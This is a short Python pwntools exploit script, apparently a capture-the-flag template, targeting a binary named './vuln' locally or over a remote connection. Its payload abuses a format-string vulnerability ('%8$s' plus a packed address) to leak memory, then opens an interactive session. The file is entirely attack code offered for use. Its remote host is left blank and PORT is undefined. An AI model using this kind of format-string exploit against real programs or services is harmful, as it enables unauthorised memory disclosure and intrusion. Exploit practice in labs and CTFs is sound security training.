#!/usr/bin/python3
from pwn import *
gs = '''
continue
'''
#REMOTE = True      # test remote
REMOTE =False       # test local

elf = context.binary = ELF('./vuln')

if REMOTE :
    #p = remote('REMOTEIP',PORT) # test remote
    p = remote('',PORT)
else:
	p = process('./vuln')

#========= exploit here ===================

payload = b'%8$s||||'
payload += p32(0x8048000)

p.sendline(payload)

#========= interactive ====================

p.interactive()
